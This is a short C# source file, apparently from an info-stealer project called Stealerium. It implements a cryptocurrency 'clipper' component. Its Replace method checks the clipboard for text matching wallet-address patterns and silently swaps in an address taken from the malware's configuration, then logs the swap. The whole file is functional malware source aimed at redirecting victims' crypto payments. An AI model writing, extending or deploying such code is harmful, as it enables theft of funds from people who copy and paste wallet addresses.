using Stealerium.Helpers;

namespace Stealerium.Clipper
{
    internal sealed class Buffer
    {
        // Find & Replace crypto addresses in clipboard
        public static void Replace()
        {
            var buffer = ClipboardManager.ClipboardText;
            if (string.IsNullOrEmpty(buffer))
                return;
            foreach (var dictonary in RegexPatterns.PatternsList)
            {
                var cryptocurrency = dictonary.Key;
                var pattern = dictonary.Value;
                if (pattern.Match(buffer).Success)
                {
                    var replaceTo = Config.ClipperAddresses[cryptocurrency];
                    if (!string.IsNullOrEmpty(replaceTo) && !replaceTo.Contains("---") && !buffer.Equals(replaceTo))
                    {
                        Clipboard.SetText(replaceTo);
                        Logging.Log("Clipper replaced to " + replaceTo);
                        return;
                    }
                }
            }
        }
    }
}